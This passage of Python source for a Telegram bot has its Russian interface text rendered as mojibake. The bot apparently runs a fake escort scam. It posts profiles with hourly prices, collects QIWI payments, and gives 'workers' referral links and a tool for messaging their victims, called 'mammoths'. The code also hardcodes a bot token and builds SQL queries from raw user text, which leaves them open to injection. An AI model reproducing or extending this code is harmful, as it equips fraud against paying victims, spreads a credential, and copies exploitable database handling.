            await message.answer("–†–∞—Å—Å—ã–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞",reply_markup=GlavMenu)
fuk = "5192510697:AAGp9i4cOhXUtW3BO7py3FpVKJSVRWD6Nf8"

@dp.message_handler(state="chas")
async def chas(message, state: FSMContext):
    with sqlite3.connect("data.db") as c:
        vi = c.execute(f"select photoid from users where id = {message.chat.id}").fetchone()[0]
        bnow = c.execute(f"select balance from users where id = {message.chat.id}").fetchone()[0]
        op = c.execute(f"select cena from ancety where id = {vi}").fetchone()[0]
    if message.text == '–û—Ç–º–µ–Ω–∞‚ùå':
        await message.answer("–û—Ç–º–µ–Ω–µ–Ω–æ.",reply_markup=GlavMenu)
        await state.finish()
    else:
        if message.text.isdigit():
            if int(message.text) >= 0 and int(message.text) <=24:
                if int(message.text)%1 == 0:
                    if int(message.text) >=2:
                        op = op + (int(message.text)*op)/2
                    if op > bnow:
                        await message.answer(f"–ù–∞ –±–∞–ª–∞–Ω—Å–µ –Ω–µ –¥–æ—Å—Ç–∞—Ç–∞—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤.\n–°—É–º–º–∞ –∑–∞–∫–∞–∑–∞ {op}\n–ù–∞ –±–∞–ª–∞–Ω—Å–µ {bnow}",reply_markup=bal)
                        await state.finish()
                    else:
                        with sqlite3.connect("data.db") as c:
                            c.execute(f"UPDATE users SET balance = {bnow-op} WHERE id = {message.chat.id}")
                        await message.answer(f"–£—Å–ø–µ—à–Ω–∞—è –æ–ø–ª–∞—Ç–∞\n\n–û–∂–∏–¥–∞–π—Ç–µ —Å–∫–æ—Ä–æ —Å –≤–∞–º–∏ —Å–≤—è–∂—É—Ç—Å—è",reply_markup=GlavMenu)
                        await state.finish()
                else:
                    await message.answer("–í–≤–µ–¥–∏—Ç–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ.")
                    await state.set_state("chas")
            else:
                await message.answer("–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç 1 –¥–æ 24.")
                await state.set_state("chas")
        else:
            await message.answer("–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ.")
            await state.set_state("chas")

@dp.message_handler(state="addphoto")
async def otklancete(message, state: FSMContext):
    if message.text == '–û—Ç–º–µ–Ω–∞‚ùå':
        await message.answer("<b>–û—Ç–º–µ–Ω–µ–Ω–æ</b>",reply_markup=GlavMenu)
    else:
        if message.from_user.id in config.ADMINS:
            if message.text.isdigit():
                nnn = int(message.text)
                with sqlite3.connect("data.db") as c:
                    addcount = c.execute(f"select count(*) from ancety where id = {nnn}").fetchone()[0]
                if addcount == 0:
                    await message.answer("–ê–Ω–∫–µ—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞\n–ù–∞–ø–∏—à–∏—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –Ω–æ–º–µ—Ä")
                else:
                    with sqlite3.connect("data.db") as c:
                        countphotos = c.execute(f"select count(*) from photos").fetchone()[0]
                        mphoto = c.execute(f"select mainphoto from ancety where id = {nnn}").fetchone()[0]
                        c.execute(f"INSERT INTO photos (id,anceta,image)VALUES ({countphotos+1},{nnn},\'{mphoto}\')")
                    await message.answer("–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–æ—Ç–æ.")
                    await state.set_state("addimage")
            else:
                await message.answer("–ù–∞–ø–∏—à–∏—Ç–µ —á–∏—Å–ª–æ")

@dp.message_handler(content_types=['photo'], state="addimage")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        id = random.randint(0, 10000)
        imglink = f"{id}.jpg"
        await message.photo[-1].download(r"images/" + str(id) + ".jpg")
        with sqlite3.connect("data.db") as c:
            countphotos = c.execute(f"SELECT COUNT(*) FROM photos").fetchone()[0]
            c.execute(f"UPDATE photos SET image = '{imglink}' WHERE id = {countphotos}")
        await message.answer("–§–æ—Ç–æ –¥–æ–±–∞–≤–ª–µ–Ω–æ.",reply_markup=GlavMenu)
    await state.finish()

@dp.message_handler(content_types=['photo'], state="new_anketa")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        id = random.randint(0, 10000)
        imglink = f"{id}.jpg"
        await message.photo[-1].download(r"images/" + str(id) + ".jpg")
        with sqlite3.connect("data.db") as c:
            cak = c.execute(f"SELECT COUNT(*) FROM ancety").fetchone()[0]
            c.execute("INSERT INTO ancety (id,mainphoto,name,cena,about) VALUES (?,?,?,?,?)",(cak+1,imglink,"a","a", "0",))
        await message.answer("–§–æ—Ç–æ –¥–æ–±–∞–≤–ª–µ–Ω–æ\n\n–ö–∞–∫ –±—É–¥–µ–º –Ω–∞–∑—ã–≤–∞—Ç—å —ç—Ç—É –±–∞–±–æ—á–∫—É?üôÉ")
        await state.set_state("new_anketa_name")

@dp.message_handler(state="new_anketa_name")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        with sqlite3.connect("data.db") as c:
            asdas = c.execute(f"select count(*) from ancety").fetchone()[0]
            c.execute(f"UPDATE ancety SET name = \'{message.text}\' WHERE id = {asdas}")
        await message.answer("–ò–º—è –≤—ã–±—Ä–∞–Ω–æ ‚úÖ\n–í–≤–µ–¥–∏—Ç–µ —Ü–µ–Ω—É –±–∞–±–æ—á–∫–∏ –∑–∞ —á–∞—Å üí∏")
        await state.set_state("new_anketa_price")

@dp.message_handler(state="new_anketa_price")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        if message.text.isdigit():
            with sqlite3.connect("data.db") as c:
                sadasadas = c.execute(f"select count(*) from ancety").fetchone()[0]
                c.execute(f"UPDATE ancety SET cena = {int(message.text)} WHERE id = {sadasadas}")
            await message.answer("–¶–µ–Ω–∞ –≤—ã–±—Ä–∞–Ω–∞ ‚úÖ\n–í–≤–µ–¥–∏—Ç–µ —É—Å–ª—É–≥–∏ –¥–µ–≤—É—à–∫–∏")
            await state.set_state("new_anketa_uslugi")
        else:
            await message.answer("–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ")
            await state.set_state("new_anketa_price")

@dp.message_handler(state="new_anketa_uslugi")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        with sqlite3.connect("data.db") as c:
            adss = c.execute(f"select count(*) from ancety").fetchone()[0]
            c.execute(f"UPDATE ancety SET about = \'{message.text}\' WHERE id = {adss}")
            anketa = c.execute(f"select * from ancety where id = {adss}").fetchone()
        photo = open(f"images/{anketa[1]}", 'rb')
        await bot.send_photo(message.chat.id, photo, caption=f"üíÅ‚Äç‚ôÄÔ∏è–ò–º—è: {anketa[2]}\n\nüí∞–¶–µ–Ω–∞ –∑–∞ —á–∞—Å: {anketa[3]}\n\nüßö‚Äç‚ôÄÔ∏è–û —Å–µ–±–µ: {anketa[4]}")
        await message.answer("–ê–Ω–∫–µ—Ç–∞ –≥–æ—Ç–æ–≤–∞ !",reply_markup=GlavMenu)
        await state.finish()

@dp.message_handler(state="mamontmessage")
async def addimage(message, state: FSMContext):
    if message.text == '–û—Ç–º–µ–Ω–∞‚ùå':
        await message.answer("<b>–û—Ç–º–µ–Ω–µ–Ω–æ</b>",reply_markup=GlavMenu)
        await state.finish()
    elif ":" in message.text:
        m = message.text.split(":")
        if m[0].isdigit():
            with sqlite3.connect("data.db") as c:
                est = c.execute(f"SELECT COUNT(*) FROM users WHERE id = {m[0]} AND boss = {message.from_user.id}").fetchone()[0]
            if est == 0:
                await message.answer("<b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–∞–∑–µ –∏–ª–∏ –Ω–µ –≤–∞—à</b>")
            else:	
                try:
                    await bot.send_message(m[0],m[1])
                    await message.answer("<b>–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ.</b>",reply_markup=GlavMenu)
                except:
                    await message.answer("<b>–°–æ–æ–±—â–µ–Ω–∏–µ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ\n–°–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–ª –±–æ—Ç–∞.</b>",reply_markup=GlavMenu)
            info = await bot.get_me()
            await message.answer("‚öôÔ∏è <b>–í–æ—Ä–∫–µ—Ä –ø–∞–Ω–µ–ª—å\n\n–í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞</b>\n<code>http://t.me/" + info["username"] + "?start=" + str(message.from_user.id) + "</code>",reply_markup=wrk)
            await state.finish()
        else:
            await message.answer("<b>–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –¥–∞–Ω–Ω—ã—Ö</b>")
            await state.set_state("mamontmessage")
    else:
        await message.answer("<b>–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –¥–∞–Ω–Ω—ã—Ö</b>")
        await state.set_state("mamontmessage")

@dp.message_handler(state="popolni")
async def addimage(message, state: FSMContext):
    if message.text == '–û—Ç–º–µ–Ω–∞‚ùå':
        await message.answer("<b>–û—Ç–º–µ–Ω–µ–Ω–æ</b>",reply_markup=GlavMenu)
        await state.finish()
    else:	
        if message.text.isdigit():
            skolko = int(message.text)
            if skolko >= config.minimalka and skolko <= config.maximalka:
                try:
                    with sqlite3.connect("data.db") as c:
                        c.execute(f"DELETE FROM oplata WHERE id = {message.chat.id}")
                except Exception as e:
                    raise
                comment = random.randint(10000, 9999999)
                with sqlite3.connect("data.db") as c:
                    c.execute(f"INSERT INTO oplata (id, code) VALUES({message.chat.id}, {comment})")
                    qiwinumber = c.execute(f"select num from qiwi").fetchone()[0]
                link = f"https://qiwi.com/payment/form/99?extra%5B%27account%27%5D={qiwinumber}&amountInteger={skolko}&amountFraction=0&currency=643&extra%5B%27comment%27%5D={comment}&blocked[0]=sum&blocked[1]=account&blocked[2]=comment"
                kb = types.InlineKeyboardMarkup()
                kb.add(InlineKeyboardButton(text="–û–ø–ª–∞—Ç–∏—Ç—å", callback_data="site", url=link))
                kb.add(InlineKeyboardButton(text='–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É', callback_data='prov'))
                await message.answer("üåê <b>–û–ø–ª–∞—Ç–∞ —Å—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∞ —É—Å–ø–µ—à–Ω–æ.</b>", reply_markup=GlavMenu)
                await message.answer(f'‚ôªÔ∏è <b>–û–ø–ª–∞—Ç–∞ <a href="{link}">Qiwi.</a>\n\n'
                                     f"–ö–æ—à–µ–ª–µ–∫:</b> <code>+{qiwinumber}</code>\n"
                                     f"<b>–ö –æ–ø–ª–∞—Ç–µ:</b> <code>{skolko} ‚ÇΩ</code>\n"
                                     f"<b>–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π:</b> <code>{comment} ‚ÇΩ</code>\n\n", reply_markup=kb)
                await state.finish()
            else:
                await message.answer(f"<b>–°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç</b> {minimalka} <b>–¥–æ</b> {maximalka}.")
                await state.set_state("popolni")
        else:
            await message.answer("<b>–≠—Ç–æ –Ω–µ —á–∏—Å–ª–æ</b>")
            await state.set_state("popolni")

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
